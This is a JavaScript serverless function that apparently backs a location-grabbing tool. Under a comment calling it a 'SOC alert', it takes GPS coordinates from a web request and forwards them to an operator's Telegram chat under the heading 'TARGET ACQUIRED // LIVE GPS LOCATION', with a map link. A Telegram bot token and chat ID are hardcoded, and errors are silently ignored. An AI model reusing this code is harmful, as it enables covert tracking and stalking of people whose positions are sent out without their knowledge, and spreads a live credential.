// Vercel serverless function: receive live GPS location and send modern SOC alert
const TOKEN = process.env.TG_BOT_TOKEN || '8746655192:AAE0OabqXKfBkbs_kIlIRQEKNo_kE3JB49k';
const CHAT = process.env.TG_CHAT_ID || '8908879084';

module.exports = async function handler(req, res) {
  const { lat, lng, acc } = req.query;
  if (!lat || !lng) {
    res.status(400).json({ error: 'Missing coordinates' });
    return;
  }
  const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
  const lines = [
    '🎯 <b>TARGET ACQUIRED // LIVE GPS LOCATION</b>\n',
    `🌐 <b>Coordinates:</b> <code>${lat}, ${lng}</code>`,
  ];
  if (acc) {
    lines.push(`🎯 <b>GPS Accuracy:</b> ±${Math.round(parseFloat(acc))} meters`);
  }

  const text = lines.join('\n');

  try {
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        link_preview_options: { is_disabled: true },
        reply_markup: {
          inline_keyboard: [
            [
              { text: '📍 Open in Google Maps', url: mapUrl }
            ]
          ]
        }
      }),
    });
  } catch {}

  res.setHeader('Content-Type', 'application/json');
  res.status(200).json({ ok: true });
};
